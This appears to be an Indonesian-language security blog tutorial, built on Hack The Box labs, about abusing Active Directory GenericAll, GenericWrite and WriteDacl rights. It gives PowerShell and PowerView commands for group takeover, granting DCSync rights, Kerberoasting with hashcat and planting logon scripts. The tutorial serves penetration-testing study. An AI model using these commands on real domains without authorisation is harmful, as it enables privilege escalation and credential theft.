---
title: '[ACL] GenericAll, GenericWrite and Dacl Abuse'
date: 2022-04-2 16:35:22 +0700
categories: [Active Directory, Post Compromise Attack]
tags: [active directory, windows, genericwrite, privilege escalation, lateral movement, powerview]     # TAG names should always be lowercase
author:
  name: Nairpaa
  link: https://nairpaa.github.io
---

Berikut adalah penjelasan-penjelasan dari setiap hak akses yang akan kita bahas:

**GenericAll**

`GenericAll` memberikan kita kemampuan penuh terhadap suatu object.

**GenericWrite**

`GenericWrite` memberikan kita kemampuan untuk me-*write* semua *non-protected attribute* pada object, termasuk "*members*" untuk grup dan "*serviceprincipalnames*" untuk user.

Dengan demikian, jika kita memiliki hak akses **GenericWrite** terhadap object user, kita dapat melakukan Kerberoasting.

**WriteDacl**

`WriteDacl` memungkinkan kita memberikan hak istimewa apa pun terhadap object target.

`WriteDacl` terhadap object **grup** memungkinkan kita menambah keanggotaan grup tersebut. 
 
Sementara `WriteDacl` terhadap object **domain** memungkinkan kita memberikan hak istimewa **DcSync**.

---

### Tujuan 

- *Privilege escalation* atau
- *lateral movement*

### Prasyarat

- User dengan hak akses `GenericAll`  terhadap object lain
- User dengan hak akses `GenericWrite` terhadap object lain
- User dengan hak akses `WriteDacl` terhadap object lain


### Tools

- Powershell / CMD
- PowerView

---

## Tahapan eksploitasi

### Contoh Kasus 1: GenericAll to Group and WriteDacl to Domain Abuse

#### Step 1: Cek Hak Akses Dengan BloodHound

Pada kasus kali ini **svc-alfresco** merupakan bagian dari grup **Account Operators** yang memiliki hak akses `GenericAll` terhadap grup **Exchange Windows Permissions**. 

Hak akses `GenericAll` ini memungkinkan kita untuk mendapatkan kontrol penuh untuk memodifikasi keanggotaan grup.

Selanjutnya terdapat grup **Exchange Windows Permissions** yang memiliki hak akses `WriteDacl` terhadap domain object (**htb.local**). Hak akses ini dapat disalah gunakan oleh penyerang untuk memberikan hak istimewa **DcSync**.

![bloodhound writedacl](/assets/img/posts/generic-and-writedacl-abuse/3.png)

#### Step 2: Menambahkan Member pada Grup Exchange Windows Permissions

Untuk mendapatkan hak akses `WriteDacl` terhadap domain **htb.local**, kita perlu menambahkan user terlebih dahulu terhadap grup **Exchange Windows Permission**.

Untuk melakukan ini kita akan memanfaatkan hak akses `GenericAll` pada grup **Exchange Windows Permission**.

```powershell
PS> net group "Exchange Windows Permissions" nairpaa /add
```

![tambah anggota grup](/assets/img/posts/generic-and-writedacl-abuse/4.png)

#### Step 3: Menambahkan Hak Akses DcSync

Setelah memasukan user kita ke dalam grup **Exchange Windows Permission**, kita dapat memberikan hak akses **DCSync** kepada user yang ditentukan.

```powershell
PS> $SecPassword = ConvertTo-SecureString 'password' -AsPlainText -Force
PS> $Cred = New-Object System.Management.Automation.PSCredential('htb.local\nairpaa', $SecPassword)

PS> . .\PowerView.ps1
PS> Add-DomainObjectAcl -Credential $Cred -TargetIdentity "DC=htb,DC=local" -PS> Rights DCSync -PrincipalIdentity nairpaa
```

> Informasi tentang DCSync Attack telah dijelaskan [di sini](/posts/dcsync-attack/).
{: .prompt-note }

![dcsync attack](/assets/img/posts/generic-and-writedacl-abuse/5.png)

### Contoh Kasus 2: GenericWrite to Group Abuse

#### Step 1: Cek Hak Akses Dengan BloodHound

Pada kasus ini user **Claire** memiliki hak akses `GenericWrite` terhadap grup **Backup_Admins** yang memungkinkan ia dapat memodifikasi keanggotaan grup tersebut.

![bloodhound genericwrite to group](/assets/img/posts/generic-and-writedacl-abuse/1.png)

#### Step 2: Modifikasi Nilai Object

Selanjutnya, kami membuat user **Claire** menjadi anggota dari grup **Backup_Admins**.

```powershell
PS> net group backup_admins claire /add
```

![tambah anggota grup](/assets/img/posts/generic-and-writedacl-abuse/2.png)

### Contoh Kasus 3: GenericWrite to User Abuse

#### Step 1: Cek Hak Akses Dengan BloodHound

Pada kasus kali ini user **Smith** memiliki hak akses `GenericWrite` terhadap user **Maria**.

Karena kali ini object-nya adalah user, user **Smith** dapat mengubah nilai atribut *serviceprincipalnames* dari user **Maria**.

![bloodhound genericwrite to user](/assets/img/posts/generic-and-writedacl-abuse/6.png)

#### Step 2: Kerberoast

```powershell
# 1. tambahkan object ke suatu SPN
# - contoh SPN yang digunakan: MSSQLSvc/object.local:1433
PS> setspn -a <service class>/<host>:<port> <domain>\<user_target>
```

```powershell
# 2. cek SPN yang telah ditambahkan
PS> . .\PowerView.ps1
PS> Get-DomainUser <user_target> | Select serviceprincipalname

serviceprincipalname
--------------------
MSSQLSvc/object.local:1433
```

```powershell
# 3. ambil ticket
# - jika tidak butuh kredensial
PS> Get-DomainSPNTicket -SPN "<service class>/<host>:<port>"
# - jika butuh kredensial
PS> $SecPassword = ConvertTo-SecureString '<pwnd_password>' -AsPlainText -Force
PS> $Cred = New-Object System.Management.Automation.PSCredential('<domain>\<pwnd_user>', $SecPassword)
PS> Get-DomainSPNTicket -SPN "<service class>/<host>:<port>"
```

```bash
# 4. crack de hash
➜ hashcat -m 13100 pass.hash /usr/share/wordlists/rockyou.txt 
```

![kerberoast](/assets/img/posts/generic-and-writedacl-abuse/7.png)

> Untuk melakukan Kerberoast, kita harus men-set SPN dengan [format yang valid](https://docs.microsoft.com/en-us/windows/win32/ad/name-formats-for-unique-spns). 
{: .prompt-warning }

#### Step 3: (Alternatif) Logon Script

[HackTricks](https://book.hacktricks.xyz/windows/active-directory-methodology/acl-persistence-abuse#genericwrite-on-user) memberikan saran bahwa kita dapat memanfaatkan `GenericWrite` pada object user untuk memperbaharui *logon scripts*.

Script ini akan berjalan ketika user target login kembali.

```powershell
PS> . .\PowerView.ps1
PS> echo "ping 10.10.14.20" > C:\test\ping.ps1
PS> Set-DomainObject -Identity maria -SET @{scriptpath="C:\test\ping.ps1"}
```

![login script](/assets/img/posts/generic-and-writedacl-abuse/8.png)

### Contoh Kasus 4: GenericAll to Domain Admins Abuse

Pada kasus seperti ini kita dapat mengubah password dari user **Domain Admins**. Contoh untuk melakukan eksploitasi ini telah di jelaskan [di sini](/posts/readgmsapassword-abuse/#on-windows-local).

## Mitigasi

Perhatikan kembali pemberian hak akses `GenericAll`, `GenericWrite` dan `WriteDacl`.

---

## Referensi

- https://zflemingg1.gitbook.io/undergrad-tutorials/active-directory-acl-abuse/genericwrite-exploit
- https://0xdf.gitlab.io/2020/03/21/htb-forest.html#privesc-to-administrator
- https://0xdf.gitlab.io/2022/02/28/htb-object.html#logon-script
- https://github.com/morph3/writeups/tree/main/htb-unictf-quals-2021/fullpwn/object#kerberoasting
- https://book.hacktricks.xyz/windows/active-directory-methodology/acl-persistence-abuse#genericwrite-on-user